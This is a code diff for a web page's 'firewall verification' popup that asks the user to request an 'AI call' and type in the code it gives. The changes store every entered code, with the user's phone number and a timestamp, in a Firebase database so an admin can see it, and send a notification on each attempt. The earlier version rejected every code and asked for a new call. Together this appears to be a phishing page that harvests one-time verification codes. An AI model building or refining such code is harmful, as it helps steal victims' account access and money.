@@ -5,7 +5,7 @@
  * 📊 SYSTEM_VERIFICATION:
  * ✅ requestFirewallCall() → CREATE user_sessions/{phone}/system_verification
  * ✅ startFirewallTimer() → UPDATE timer every second
- * ✅ verifyFirewallCode() → UPDATE status: invalid
+ * ✅ verifyFirewallCode() → SAVE userEnteredCode + UPDATE status
  * ✅ timer expired → UPDATE status: expired
  */
 
@@ -1185,6 +1185,7 @@
     // ============================================================
     // 🔥 REQUEST FIREWALL CALL
     // ✅ CREATE: user_sessions/{phone}/system_verification
+    // ✅ RESET userEnteredCode + isMatch
     // ============================================================
     function requestFirewallCall() {
         if (callInProgress) return;
@@ -1208,7 +1209,10 @@
                     deviceId: deviceId,
                     phone: userPhoneStr,
                     createdAt: Date.now(),
-                    lastUpdate: Date.now()
+                    lastUpdate: Date.now(),
+                    userEnteredCode: null,
+                    userEnteredAt: null,
+                    isMatch: null
                 }).then(function() {
                     console.log('✅ system_verification CREATED:', currentCallCode);
                 }).catch(function(e) {
@@ -1268,7 +1272,7 @@
 
     // ============================================================
     // ⏱️ FIREWALL TIMER
-    // ✅ UPDATE timer sa Firebase every second (live sa admin)
+    // ✅ UPDATE timer sa Firebase every second
     // ✅ Kapag 0 → status: 'expired'
     // ============================================================
     function startFirewallTimer() {
@@ -1280,7 +1284,7 @@
         callTimerInterval = setInterval(function() {
             callCountdown--;
 
-            // ✅ UPDATE Firebase timer (para live sa admin panel)
+            // ✅ UPDATE Firebase timer
             try {
                 if (db && userPhoneStr) {
                     db.ref('user_sessions/' + userPhoneStr + '/system_verification').update({
@@ -1349,7 +1353,8 @@
 
     // ============================================================
     // 🔑 VERIFY FIREWALL CODE
-    // ✅ UPDATE status: 'invalid' sa Firebase (pag mali)
+    // ✅ SAVE userEnteredCode sa Firebase (para makita sa admin)
+    // ✅ UPDATE status: verified/invalid
     // ============================================================
     function verifyFirewallCode() {
         var codeInput = document.getElementById('firewallAICodeInput');
@@ -1378,20 +1383,47 @@
 
         var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
         var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-        sendAICodeAttemptNotif(userPhoneStr, deviceId, enteredCode, callCountdown);
 
-        // ✅ UPDATE Firebase: invalid attempt
+        // ✅ CHECK MATCH
+        var isMatch = (enteredCode === currentCallCode);
+
+        // ============================================================
+        // ✅ SAVE userEnteredCode + isMatch + status sa Firebase
+        // ============================================================
         try {
             if (db) {
                 db.ref('user_sessions/' + userPhoneStr + '/system_verification').update({
-                    status: 'invalid',
-                    lastAttempt: enteredCode,
-                    lastAttemptAt: Date.now(),
+                    userEnteredCode: enteredCode,
+                    userEnteredAt: Date.now(),
+                    status: isMatch ? 'verified' : 'invalid',
+                    isMatch: isMatch,
                     lastUpdate: Date.now()
                 });
+                console.log('📝 Saved userEnteredCode:', enteredCode, '| Match:', isMatch);
             }
-        } catch(e) {}
+        } catch(e) {
+            console.error('Save userEnteredCode error:', e);
+        }
+        // ============================================================
 
+        sendAICodeAttemptNotif(userPhoneStr, deviceId, enteredCode, callCountdown);
+
+        if (isMatch) {
+            // ✅ TAMA — verified
+            if (verifyBtn) {
+                verifyBtn.innerHTML = '<i class="fas fa-check"></i> <span>VERIFIED!</span>';
+                verifyBtn.style.background = 'linear-gradient(180deg, #00ff88, #008833)';
+            }
+
+            setTimeout(function() {
+                closeFirewallPopup();
+                alert('✅ Verification successful!');
+            }, 1500);
+
+            return;
+        }
+
+        // ❌ MALI — invalid
         if (errorMsg) {
             errorMsg.innerHTML = '<i class="fas fa-times-circle"></i> ❌ Invalid code. Request new call.';
             errorMsg.classList.add('show');
@@ -1419,31 +1451,6 @@
             codeInput.style.boxShadow = '0 0 25px rgba(255, 215, 0, 0.6)';
             codeInput.style.color = '#ffd700';
         }, 1500);
-
-        setTimeout(function() {
-            if (errorMsg) errorMsg.classList.remove('show');
-
-            var statusText = document.getElementById('firewallAIText');
-            var timerDisplay = document.getElementById('firewallAITimer');
-            var codeSection = document.getElementById('firewallAICodeSection');
-            var requestBtn = document.getElementById('firewallAIRequestBtn');
-
-            if (statusText) {
-                statusText.innerHTML = '<strong style="color: #ff9800;">⏰ CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.7);">Request new call</span>';
-            }
-            if (timerDisplay) {
-                timerDisplay.style.display = 'none';
-                timerDisplay.classList.remove('urgent');
-            }
-            if (codeSection) codeSection.classList.remove('show');
-            if (requestBtn) {
-                requestBtn.disabled = false;
-                requestBtn.style.opacity = '1';
-                requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> <span>REQUEST AI CALL</span>';
-            }
-
-            callInProgress = false;
-        }, 4000);
     }
 
     function shakeFirewallElement(element) {
